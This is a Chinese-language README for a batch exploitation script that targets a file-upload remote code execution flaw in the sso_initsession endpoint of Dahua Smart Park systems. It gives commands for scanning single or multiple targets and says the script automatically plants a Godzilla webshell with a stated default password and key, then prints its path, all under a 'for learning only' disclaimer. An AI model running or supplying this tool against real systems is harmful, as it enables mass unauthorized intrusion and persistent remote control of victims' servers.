# 大华智慧园区系统sso_initsession文件上传漏洞批量脚本

# 本工具仅供学习测试使用，请勿用于非法用途！！！



## 使用

使用前安装依赖

```
pip intall -r requirements.txt
```

1.单个目标进行测试

```sh
python3 Dahua_sso_initsession_rce.py -u target
```

2.批量测试

```sh
python3 Dahua_sso_initsession_rce.py -f targets
```

## 示例

发现漏洞后会自动上传webshell，并输出webshell路径

![image-20230830171043324](https://github.com/A0WaQ4/Dahua_sso_initsession_upload_rce/blob/main/img/image-20230830171043324.png)

脚本默认使用哥斯拉webshell，密码默认为gslshell，key为key，可修改文件夹下的`shell.jsp`为自己的webshell

![image-20230830171131178](https://github.com/A0WaQ4/Dahua_sso_initsession_upload_rce/blob/main/img/image-20230830171131178.png)



